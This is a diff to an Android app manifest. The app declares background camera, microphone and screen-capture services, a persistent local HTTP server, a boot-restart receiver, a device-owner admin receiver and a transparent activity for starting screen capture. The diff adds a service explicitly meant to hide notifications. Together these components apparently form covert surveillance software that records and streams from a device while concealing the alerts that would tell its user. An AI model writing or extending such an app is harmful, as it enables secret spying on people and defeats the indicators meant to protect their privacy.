@@ -2,28 +2,25 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
+    <!-- Tus permisos existentes... -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-
-    <!-- Permisos de Red y Conectividad -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-
-    <!-- Permisos de Mantenimiento y Sistema -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-
-    <!-- Permisos de Hardware -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- Permisos para Servicios en Primer Plano (Foreground) -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
+    <!-- NUEVO: permiso necesario para el listener de notificaciones -->
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
 
     <application
         android:allowBackup="true"
@@ -44,7 +41,6 @@
             </intent-filter>
         </activity>
 
-        <!-- Arranque automático del servidor después del reinicio -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -56,7 +52,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Servicio que mantiene vivo únicamente el servidor -->
         <service
             android:name=".ServerService"
             android:enabled="true"
@@ -68,7 +63,6 @@
                 android:value="persistent local HTTP server for user-requested LAN streaming" />
         </service>
 
-        <!-- Actividad Transparente para Iniciar MediaProjection -->
         <activity
             android:name=".ProjectionActivity"
             android:exported="true"
@@ -77,7 +71,6 @@
             android:noHistory="true"
             android:launchMode="singleInstance" />
 
-        <!-- Servicio Foreground para Cámara, Micrófono y MediaProjection -->
         <service
             android:name=".CameraService"
             android:enabled="true"
@@ -88,7 +81,6 @@
                 android:value="background streaming and camera service" />
         </service>
 
-        <!-- Admin Receiver de Device Owner -->
         <receiver
             android:name=".AdminReceiver"
             android:description="@string/app_name"
@@ -102,6 +94,16 @@
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
             </intent-filter>
         </receiver>
+
+        <!-- ===== NUEVO SERVICIO PARA OCULTAR NOTIFICACIONES ===== -->
+        <service
+            android:name=".NotificationHiderService"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
 
     </application>
 </manifest>
